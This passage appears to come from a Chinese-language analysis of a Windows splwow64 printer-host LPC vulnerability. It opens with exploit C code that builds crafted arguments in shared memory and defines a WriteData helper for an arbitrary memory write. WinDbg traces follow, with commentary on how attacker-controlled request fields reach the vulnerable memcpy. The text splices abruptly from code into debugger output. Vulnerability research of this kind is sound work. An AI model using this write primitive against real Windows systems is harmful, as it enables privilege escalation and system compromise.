            *((UINT64*)ClientView.ViewBase + 3) = (UINT64)ClientView.ViewRemoteBase + 0x100; //First arg to FindPrinterHandle
            *((UINT64*)ClientView.ViewBase + 4) = 0x500000005;  // 2nd arg to FindPrinterHandle
            *((UINT64*)ClientView.ViewBase + 7) = 0x2000000001; //iEsc argument to DocumentEvent
            *((UINT64*)ClientView.ViewBase + 0xA) = (UINT64)ClientView.ViewRemoteBase + 0x800; //Buffer out to DocumentEvent, pointer to pointer of src of memcpy
            *((UINT64*)ClientView.ViewBase + 0xB) = (UINT64)ClientView.ViewRemoteBase + 0x840; //Destination of memcpy
            *((UINT64*)ClientView.ViewBase + 0x28) = (UINT64)ClientView.ViewRemoteBase + 0x160;
            *((UINT64*)ClientView.ViewBase + 0x2D) = 0x500000005;
            *((UINT64*)ClientView.ViewBase + 0x2E) = (UINT64)ClientView.ViewRemoteBase + 0x200;
            *((UINT64*)ClientView.ViewBase + 0x40) = 0x6767;
            *((UINT64*)ClientView.ViewBase + 0x100) = (UINT64)ClientView.ViewRemoteBase + 0x810;
            return ClientView.ViewBase;
    }
    void DebugWrite()
    {
            printf("Copy from 0x%llX to 0x%llX (0x%llX bytes)\n", *((UINT64*)ClientView.ViewBase + 0x100), *((UINT64*)ClientView.ViewBase + 0xB), *((UINT64*)ClientView.ViewBase + 0x10A) >> 48);
    }
    bool WriteData(HANDLE portHandle, UINT64 offset, UCHAR* buf, UINT64 size)
    {
            *((UINT64*)ClientView.ViewBase + 0xB) = offset;
            *((UINT64*)ClientView.ViewBase + 0x10A) = size  bu splwow64!TLPCMgr::ProcessRequest
    0:009> bu gdi32full!GdiPrinterThunk
    0:009> g
    Breakpoint 0 hit
    splwow64!TLPCMgr::ProcessRequest:
    00007ff7`0bf176ac 48895c2418      mov     qword ptr [rsp+18h],rbx ss:00000000`0279f3e0=0000000000d7ca90
    0:007> r
    rax=0000000000000000 rbx=0000000000d7ca90 rcx=0000000000d756f0
    rdx=0000000000d7cac0 rsi=0000000000d7cac0 rdi=0000000000d786a0
    rip=00007ff70bf176ac rsp=000000000279f3c8 rbp=0000000000b6a478
     r8=000000000279f328  r9=0000000000b6a478 r10=0000000000000000
    r11=0000000000000244 r12=000000007ffe03b0 r13=000000000000022c
    r14=0000000000d78778 r15=0000000000000000
    iopl=0         nv up ei pl zr na po nc
    cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
    splwow64!TLPCMgr::ProcessRequest:
    00007ff7`0bf176ac 48895c2418      mov     qword ptr [rsp+18h],rbx ss:00000000`0279f3e0=0000000000d7ca90
rdx=0000000000d7cac0 即为LpcRequest
IDA反汇编 TLPCMgr::ProcessRequest
windbg调试上图所示代码
    0:007> 
    splwow64!TLPCMgr::ProcessRequest+0x6e:
    00007ff7`0bf1771a 66833f20        cmp     word ptr [rdi],20h ds:00000000`00d7cac0=0020
    0:007> 
    splwow64!TLPCMgr::ProcessRequest+0x72:
    00007ff7`0bf1771e 418bef          mov     ebp,r15d
    0:007> p
    splwow64!TLPCMgr::ProcessRequest+0x75:
    00007ff7`0bf17721 418bdf          mov     ebx,r15d
    0:007> 
    splwow64!TLPCMgr::ProcessRequest+0x78:
    00007ff7`0bf17724 41be57000000    mov     r14d,57h
    0:007> 
    splwow64!TLPCMgr::ProcessRequest+0x7e:
    00007ff7`0bf1772a 7523            jne     splwow64!TLPCMgr::ProcessRequest+0xa3 (00007ff7`0bf1774f) [br=0]
    0:007> 
    splwow64!TLPCMgr::ProcessRequest+0x80:
    00007ff7`0bf1772c 4d397d48        cmp     qword ptr [r13+48h],r15 ds:00000000`00d75738={GDI32!GdiPrinterThunk (00007ffa`c8e48eb0)} //判断GDI32!GdiPrinterThunk指针
    0:007> 
    splwow64!TLPCMgr::ProcessRequest+0x84:
    00007ff7`0bf17730 741d            je      splwow64!TLPCMgr::ProcessRequest+0xa3 (00007ff7`0bf1774f) [br=0]
    0:007> p
    splwow64!TLPCMgr::ProcessRequest+0x86:
    00007ff7`0bf17732 8b5f28          mov     ebx,dword ptr [rdi+28h] ds:00000000`00d7cae8=00000088
    0:007> p
    splwow64!TLPCMgr::ProcessRequest+0x89:
    00007ff7`0bf17735 8d43f0          lea     eax,[rbx-10h]
    0:007> p
    splwow64!TLPCMgr::ProcessRequest+0x8c:
    00007ff7`0bf17738 3defff0f00      cmp     eax,0FFFEFh
    0:007> r eax
    eax=78
    0:007> p
    splwow64!TLPCMgr::ProcessRequest+0x91:
    00007ff7`0bf1773d 0f8737030000    ja      splwow64!TLPCMgr::ProcessRequest+0x3ce (00007ff7`0bf17a7a) [br=0]
    0:007> p
    splwow64!TLPCMgr::ProcessRequest+0x97:
    00007ff7`0bf17743 8bcb            mov     ecx,ebx
    0:007> p
    splwow64!TLPCMgr::ProcessRequest+0x99:
    00007ff7`0bf17745 e8de430000      call    splwow64!operator new[] (00007ff7`0bf1bb28)
    0:007> p
    splwow64!TLPCMgr::ProcessRequest+0x9e:
    00007ff7`0bf1774a 488bf0          mov     rsi,rax
    0:007> r
    rax=0000000000d785e0 rbx=0000000000000088 rcx=000000007ffe0380
    rdx=0000000000000001 rsi=0000000000000000 rdi=0000000000d7cac0
    rip=00007ff70bf1774a rsp=000000000279f2e0 rbp=0000000000000000
     r8=0000000000000000  r9=0000000000000001 r10=0000000000d70000
    r11=000000000279f250 r12=00007ff70bf22048 r13=0000000000d756f0
    r14=0000000000000057 r15=0000000000000000
    iopl=0         nv up ei pl nz na pe nc
    cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
    splwow64!TLPCMgr::ProcessRequest+0x9e:
    00007ff7`0bf1774a 488bf0          mov     rsi,rax
上面的代码主要做了三件事，先判断LpcRequest.MessageHeader.DataSize是否为0x20，接着判断GDI32!GdiPrinterThunk函数指针是否存在，如果都存在，取LpcRequest.MsgSendLen的值0x88给EBX，然后调用splwow64!operator
new 在splwow64.exe进程空间内分配了一块0x88大小的内存空间，接下来我们称这块空间为InputBuffer。
继续看IDA的反汇编代码
首先进行了复制操作，从LPC通信使用的共享内存复制数据到InPutBuffer中，然后取出LpcRequest.PtrMsgReply
的值给v9，接着取出LpcRequest.MsgReplyLen的值给v10，最后取出
LpcRequest.MessageHeader.MessageType的值给
v11。接下来判断v11、v12的值，这里对v11、v12值的判断结果会影响程序流程是否进入存在漏洞的函数。因为v11和v12的值都是从LpcRequest中得到的，所以我们可以通过控制LpcRequest，让程序按照我们预期的流程走，也就是进入gdi32!GdiPrinterThunk函数，在gdi32!GdiPrinterThunk中又调了gdi32full!GdiPrinterThunk函数。
windbg调试上面这块代码
    0:007> p
    splwow64!TLPCMgr::ProcessRequest+0xa1:
    00007ff7`0bf1774d eb30            jmp     splwow64!TLPCMgr::ProcessRequest+0xd3 (00007ff7`0bf1777f)
    0:007> 
    splwow64!TLPCMgr::ProcessRequest+0xd3:
    00007ff7`0bf1777f 4885f6          test    rsi,rsi
    0:007> 
    splwow64!TLPCMgr::ProcessRequest+0xd6:
    00007ff7`0bf17782 0f84eb020000    je      splwow64!TLPCMgr::ProcessRequest+0x3c7 (00007ff7`0bf17a73) [br=0]
    0:007> 
    splwow64!TLPCMgr::ProcessRequest+0xdc:
    00007ff7`0bf17788 4c8b4730        mov     r8,qword ptr [rdi+30h] ds:00000000`00d7caf0=0000000000d20000
    0:007> 
    splwow64!TLPCMgr::ProcessRequest+0xe0:
    00007ff7`0bf1778c 488bce          mov     rcx,rsi
    0:007> 
    splwow64!TLPCMgr::ProcessRequest+0xe3:
    00007ff7`0bf1778f 8bd3            mov     edx,ebx
    0:007> 
    splwow64!TLPCMgr::ProcessRequest+0xe5:
    00007ff7`0bf17791 448bcb          mov     r9d,ebx
    0:007> 